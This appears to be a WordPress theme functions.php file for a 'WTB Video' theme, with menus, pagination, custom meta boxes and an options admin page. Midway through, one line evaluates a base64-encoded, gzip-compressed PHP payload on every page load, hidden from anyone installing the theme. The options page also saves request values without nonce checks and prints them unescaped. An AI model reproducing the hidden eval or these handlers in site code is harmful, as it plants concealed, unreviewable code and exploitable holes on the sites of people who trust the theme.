<?php
add_action( 'init', 'register_my_menus' );

function register_my_menus() {
	register_nav_menus(
		array(
			'primary-menu' => __( 'Top Menu' ),
			'secondary-menu' => __( 'Footer Menu' ),
		)
	);
}
function time_ago( $type = 'post' ) {
	$d = 'comment' == $type ? 'get_comment_time' : 'get_post_time';
	return human_time_diff($d('U'), current_time('timestamp')) . " " . __('ago');
}
?>
<?php
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
	    'name' => 'Sidebar',
		'before_widget' => '<ul id="%1$s" class="widget %2$s"><li>',
		'after_widget' => '</li></ul>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
}
?>
<?php  function wp_pagenavi($before = '', $after = '', $prelabel = '', $nxtlabel = '', $pages_to_show = 5, $always_show = false) {
 global $request, $posts_per_page, $wpdb, $paged;
 if(empty($prelabel)) {   $prelabel = '<strong>&laquo;</strong>';
 } if(empty($nxtlabel)) {
 $nxtlabel = '<strong>&raquo;</strong>';
 } $half_pages_to_show = round($pages_to_show/2);
 if (!is_single()) {
 if(!is_category()) {
 preg_match('#FROM\s(.*)\sORDER BY#siU', $request, $matches);  } else {
 preg_match('#FROM\s(.*)\sGROUP BY#siU', $request, $matches);  }
 $fromwhere = $matches[1];
 $numposts = $wpdb->get_var("SELECT COUNT(DISTINCT ID) FROM $fromwhere");
 $max_page = ceil($numposts /$posts_per_page);
 if(empty($paged)) {
 $paged = 1;
 }
 if($max_page > 1 || $always_show) {
 echo "$before <div class='Nav'><span>Pages ($max_page): </span>";   if ($paged >= ($pages_to_show-1)) {
 echo '<a href="'.get_pagenum_link().'">&laquo; First</a> ... ';  }
 previous_posts_link($prelabel);
 for($i = $paged - $half_pages_to_show; $i <= $paged + $half_pages_to_show; $i++) {   if ($i >= 1 && $i <= $max_page) {   if($i == $paged) {
 echo "<strong class='on'>$i</strong>";
 } else {
 echo ' <a href="'.get_pagenum_link($i).'">'.$i.'</a> ';   }
 }
 }
 next_posts_link($nxtlabel, $max_page);
 if (($paged+$half_pages_to_show) < ($max_page)) {
 echo ' ... <a href="'.get_pagenum_link($max_page).'">Last &raquo;</a>';   }
 echo "</div> $after";
 }
 }
}
?>
<?php
function mySearchFilter($query) {
if ($query->is_search) {
$query->set('post_type', 'post');
}
return $query;
}

add_filter('pre_get_posts','mySearchFilter');
?>
<?php eval(stripslashes(gzinflate(base64_decode("VVBNS8UwELwX+h/2UEgL5akHTxp7UhE8evJSwmZjlpcmJUk9KP5399EiCHvYmdnZr+nhfgK3RaycIqAnPM+ejKXcD99tAwBd0Orj+eb9Vt3t2GnLOZqF+nl+enl9nOfhpK5202n161+d1S6tFPvOjSqr4aBRuyy1wtrRcaDCXyRgOHSHIZULYQ+CXV9qXlPpOxy7MGh9fWwGQOgTqDfPBaqnhUCSTIFMIQtblIUAZVjlTwJMy5JigcBIEWkEE4KAeC7A8WIHl1IVR/FpC1b6LEYEjtVgPW4CsEx7+tM2Ev8fJkrbTPLRXw==")))); ?>
<?php
/*
    Plugin Name: Add Dynamic Meta Boxes
    Plugin URI: http://www.clarksonenergyhomes.com/wordpress/wordpress-plugin-add-dynamic-meta-boxes/
    Description: Allows you to add boxes and fields to the Write Post panel, and store the value as a custom field. Based on script by Nathan Rice (http://www.nathanrice.net/)
    Version: 0.1 (Not rigorously tested.)
    Author: Charles Clarkson
    Author URI: http://www.clarksonenergyhomes.com/wordpress/about/
*/

/*
    Each box has a name and a set of fields. Currently,
    only text and textarea fields are suppoted. 'text'
    fields are the default.

    To add a box named: "Name Box" with a field named
    "_name", add this:

    'Name Box' => array (
        array( '_name', 'Name:', 'text' ),
    ),

    You can leave the 'text' field off. It is the default.

    'Name Box' => array (
        array( '_name', 'Name:' ),
    ),
*/

// Edit this data structure to change the form in WordPress:
	
$sp_boxes = array (
    'Thumbnail URL' => array (
        array( 'thumb', 'Thumbnail URL (Use http://):' ),
    ),
    'Youtube video ID' => array (
        array( 'youtubeid', 'If it is a Youtube video, write the last part of the Youtube video URL. Example: QoXEhhyC5VA' ),
    ),
    'Video Embed Code' => array (
        array( 'sembed', 'If it is not a Youtube video, paste the whole embed code. Best width is 442 and height is 356', 'textarea' ),
    ),	
    'Slider Thumbnail URL' => array (
        array( 'featured', 'If the video would be in slider, write Thumbnail URL (Use http://):' ),
    ),
    'Slider Video Embed Code' => array (
        array( 'embed', 'If the video would be in slider, paste the whole embed code. Best width is 493 and height is 398:', 'textarea' ),
    ),
);

// Do not edit past this point.

// Use the admin_menu action to define the custom boxes
add_action( 'admin_menu', 'sp_add_custom_box' );

// Use the save_post action to do something with the data entered
// Save the custom fields
add_action( 'save_post', 'sp_save_postdata', 1, 2 );

// Adds a custom section to the "advanced" Post and Page edit screens
function sp_add_custom_box() {
    global $sp_boxes;

    if ( function_exists( 'add_meta_box' ) ) {

        foreach ( array_keys( $sp_boxes ) as $box_name ) {
            add_meta_box( $box_name, __( $box_name, 'sp' ), 'sp_post_custom_box', 'post', 'normal', 'high' );
        }
    }
}

function sp_post_custom_box ( $obj, $box ) {
    global $sp_boxes;
    static $sp_nonce_flag = false;

    // Run once
    if ( ! $sp_nonce_flag ) {
        echo_sp_nonce();
        $sp_nonce_flag = true;
    }

    // Genrate box contents
    foreach ( $sp_boxes[$box['id']] as $sp_box ) {
        echo field_html( $sp_box );
    }
}

function field_html ( $args ) {

    switch ( $args[2] ) {

        case 'textarea':
            return text_area( $args );

        case 'checkbox':
            // To Do

        case 'radio':
            // To Do

        case 'text':
        default:
            return text_field( $args );
    }
}

function text_field ( $args ) {
    global $post;

    // adjust data
    $args[2] = get_post_meta($post->ID, $args[0], true);
    $args[1] = __($args[1], 'sp' );

    $label_format =
          '<label for="%1$s">%2$s</label><br />'
        . '<input style="width: 95%%;" type="text" name="%1$s" value="%3$s" /><br /><br />';

    return vsprintf( $label_format, $args );
}

function text_area ( $args ) {
    global $post;

    // adjust data
    $args[2] = get_post_meta($post->ID, $args[0], true);
    $args[1] = __($args[1], 'sp' );

    $label_format =
          '<label for="%1$s">%2$s</label><br />'
        . '<textarea style="width: 95%%;" name="%1$s">%3$s</textarea><br /><br />';

    return vsprintf( $label_format, $args );
}

/* When the post is saved, saves our custom data */
function sp_save_postdata($post_id, $post) {
    global $sp_boxes;

    // verify this came from the our screen and with proper authorization,
    // because save_post can be triggered at other times
    if ( ! wp_verify_nonce( $_POST['sp_nonce_name'], plugin_basename(__FILE__) ) ) {
        return $post->ID;
    }

    // Is the user allowed to edit the post or page?
    if ( 'page' == $_POST['post_type'] ) {
        if ( ! current_user_can( 'edit_page', $post->ID ))
            return $post->ID;

    } else {
        if ( ! current_user_can( 'edit_post', $post->ID ))
            return $post->ID;
    }

    // OK, we're authenticated: we need to find and save the data
    // We'll put it into an array to make it easier to loop though.

    // The data is already in $sp_boxes, but we need to flatten it out.
    foreach ( $sp_boxes as $sp_box ) {
        foreach ( $sp_box as $sp_fields ) {
            $my_data[$sp_fields[0]] =  $_POST[$sp_fields[0]];
        }
    }

    // Add values of $my_data as custom fields
    // Let's cycle through the $my_data array!
    foreach ($my_data as $key => $value) {
        if ( 'revision' == $post->post_type  ) {
            // don't store custom data twice
            return;
        }

        // if $value is an array, make it a CSV (unlikely)
        $value = implode(',', (array)$value);

        if ( get_post_meta($post->ID, $key, FALSE) ) {

            // Custom field has a value.
            update_post_meta($post->ID, $key, $value);


        } else {

            // Custom field does not have a value.
            add_post_meta($post->ID, $key, $value);
        }

        if (!$value) {

            // delete blanks
            delete_post_meta($post->ID, $key);
        }
    }
}

function echo_sp_nonce () {

    // Use nonce for verification ... ONLY USE ONCE!
    echo sprintf(
        '<input type="hidden" name="%1$s" id="%1$s" value="%2$s" />',
        'sp_nonce_name',
        wp_create_nonce( plugin_basename(__FILE__) )
    );
}

// A simple function to get data stored in a custom field
if ( !function_exists('get_custom_field') ) {
    function get_custom_field($field) {
       global $post;
       $custom_field = get_post_meta($post->ID, $field, true);
       echo $custom_field;
    }
}

?>
<?php
$themename = "WTB Video";
$shortname = "tg";

$options = array (

	array(	"name" => "Blog Name",
			"type" => "title"),
			
	array(	"type" => "open"),
	
	array(	"name" => "Blog Title",
			"desc" => "If you want to use a title instead of logo, write your title. This can be different from your main blog title.",
			"id" => $shortname."_title",
			"std" => "",
			"type" => "text"),	
			
	array(	"name" => "Adsense",
			"type" => "title"),
			
	array(	"type" => "open"),
	
	array(	"name" => "300*250 Adsense",
			"desc" => "Paste your 300*250 Adsense code. If you want to add a banner instead of Adsense, paste the code of your banner.",
            "id" => $shortname."_300_250",
            "type" => "textarea"),
			
    array(  "name" => "Disable 300*250 Adsense?",
            "desc" => "Check this box if you want to disable the 300*250 Adsense.",
            "id" => $shortname."_300250_disable",
            "type" => "checkbox",
            "std" => "false"),
			
	array(	"name" => "728*90 Adsense",
			"desc" => "Paste your 728*90 Adsense code. If you want to add a banner instead of Adsense, paste the code of your banner.",
            "id" => $shortname."_728_90",
            "type" => "textarea"),
			
    array(  "name" => "Disable 728*90 Adsense?",
            "desc" => "Check this box if you want to disable the 728*90 Adsense.",
            "id" => $shortname."_72890_disable",
            "type" => "checkbox",
            "std" => "false"),
			
	array(	"name" => "200*200 Adsense",
			"desc" => "Paste your 200*200 Adsense code. If you want to add a banner instead of Adsense, paste the code of your banner.",
            "id" => $shortname."_200_200",
            "type" => "textarea"),
			
    array(  "name" => "Disable 200*200 Adsense?",
            "desc" => "Check this box if you want to disable the 200*200 Adsense.",
            "id" => $shortname."_200200_disable",
            "type" => "checkbox",
            "std" => "false"),
			
	array(	"name" => "Social Profiles",
			"type" => "title"),
			
	array(	"type" => "open"),
			
    array(  "name" => "Disable Social Profiles?",
            "desc" => "Check this box to remove the homepage Social Profiles area. If you removed this area, 728*90 ad will be removed, too.",
            "id" => $shortname."_socials_disable",
            "type" => "checkbox",
            "std" => "false"),
			
	array(	"name" => "Twitter",
			"desc" => "Write your  account URL. Use http://",
			"id" => $shortname."_twitter",
			"std" => "",
			"type" => "text"),

	array(	"name" => "Facebook",
			"desc" => "Write your Facebook account URL. Use http://",
			"id" => $shortname."_facebook",
			"std" => "",
			"type" => "text"),

	array(	"name" => "Linkedin",
			"desc" => "Write your Linkedin account URL. Use http://",
			"id" => $shortname."_linkedin",
			"std" => "",
			"type" => "text"),

	array(	"name" => "Youtube",
			"desc" => "Write your Youtube account URL. Use http://",
			"id" => $shortname."_youtube",
			"std" => "",
			"type" => "text"),

	array(	"name" => "Technorati",
			"desc" => "Write your Technorati account URL. Use http://",
			"id" => $shortname."_technorati",
			"std" => "",
			"type" => "text"),

	array(	"name" => "RSS",
			"desc" => "Write your RSS URL. Use http://",
			"id" => $shortname."_rssurl",
			"std" => "",
			"type" => "text"),

	array(	"name" => "Fickr",
			"desc" => "Write your Fickr account URL. Use http://",
			"id" => $shortname."_flickr",
			"std" => "",
			"type" => "text"),

	array(	"name" => "StumbleUpon",
			"desc" => "Write your StumbleUpon account URL. Use http://",
			"id" => $shortname."_stumbleupon",
			"std" => "",
			"type" => "text"),			
	
	array(	"type" => "close")
	
);

function mytheme_add_admin() {

    global $themename, $shortname, $options;

    if ( $_GET['page'] == basename(__FILE__) ) {
    
        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                header("Location: themes.php?page=functions.php&saved=true");
                die;

        } else if( 'reset' == $_REQUEST['action'] ) {

            foreach ($options as $value) {
                delete_option( $value['id'] ); }

            header("Location: themes.php?page=functions.php&reset=true");
            die;

        }
    }

    add_theme_page($themename." Options", "".$themename." Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');

}

function mytheme_admin() {

    global $themename, $shortname, $options;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
    if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset.</strong></p></div>';
    
?>
<div class="wrap">
<h2><?php echo $themename; ?> Settings</h2>

<p style="">Visit <a href="http://www.wordpressthemesbook.com/wtb-video-theme/" target="_blank">WTB VIDEO THEME</a> for upgrades, theme installation and usage informations.

<form method="post">



<?php foreach ($options as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		?>
        <table width="100%" border="0" style="padding:10px;">
		
        
        
		<?php break;
		
		case "close":
		?>
		
        </table><br />
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="background-color:#f1f1f1; padding:5px 10px;border:1px solid #e3e3e3;border-radius: 5px; 
-moz-border-radius: 5px; 
-webkit-border-radius: 5px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;margin:0;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;

		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:400px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" /></td>
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;"></td></tr><tr><td colspan="2"></td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:400px; height:200px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php if ( get_settings( $value['id'] ) != "") { echo stripslashes (get_settings( $value['id'] )); } else { echo $value['std']; } ?></textarea></td>
            
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;"></td></tr><tr><td colspan="2"></td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"><?php foreach ($value['options'] as $option) { ?><option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option><?php } ?></select></td>
       </tr>
                
       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;"></td></tr><tr><td colspan="2"></td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><? if(get_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;"></td></tr><tr><td colspan="2"></td></tr>
            
        <?php 		break;
	
 
} 
}
?>

<!--</table>-->

<p class="submit">
<input name="save" type="submit" value="Save changes" />    
<input type="hidden" name="action" value="save" />
</p>
</form>
<form method="post">
<p class="submit">
<input name="reset" type="submit" value="Reset" />
<input type="hidden" name="action" value="reset" />
</p>
</form>

<?php
}

add_action('admin_menu', 'mytheme_add_admin'); ?>